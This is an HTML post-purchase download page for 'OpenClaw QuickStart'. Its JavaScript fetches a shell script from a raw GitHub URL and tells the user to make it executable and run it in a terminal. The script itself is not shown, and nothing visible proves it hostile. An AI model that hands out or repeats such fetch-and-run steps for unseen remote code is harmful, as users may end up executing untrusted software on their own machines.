<!DOCTYPE html>
<html>
<head>
    <title>OpenClaw QuickStart - Download</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 600px;
            margin: 100px auto;
            text-align: center;
            background: #0f0f1a;
            color: #fff;
        }
        .container {
            background: rgba(255,255,255,0.05);
            padding: 40px;
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 { color: #a855f7; }
        .code {
            background: #1a1a2e;
            padding: 20px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            margin: 20px 0;
            word-break: break-all;
            text-align: left;
        }
        .btn {
            display: inline-block;
            background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
            color: white;
            padding: 15px 30px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 Thank You for Your Purchase!</h1>
        <p>Your OpenClaw QuickStart is ready.</p>
        
        <h3>Step 1: Download the script</h3>
        <button class="btn" onclick="downloadScript()">📥 Download quickstart-setup.sh</button>
        
        <h3 style="margin-top: 30px;">Step 2: Run in terminal</h3>
        <div class="code">chmod +x quickstart-setup.sh<br>./quickstart-setup.sh</div>
    </div>

    <script>
        function downloadScript() {
            const url = 'https://raw.githubusercontent.com/REMgm/8NTICLAB/main/quickstart-setup.sh';
            fetch(url)
                .then(function(response) { return response.blob(); })
                .then(function(blob) {
                    const a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = 'quickstart-setup.sh';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                })
                .catch(function() {
                    window.open(url, '_blank');
                });
        }
    </script>
</body>
</html>
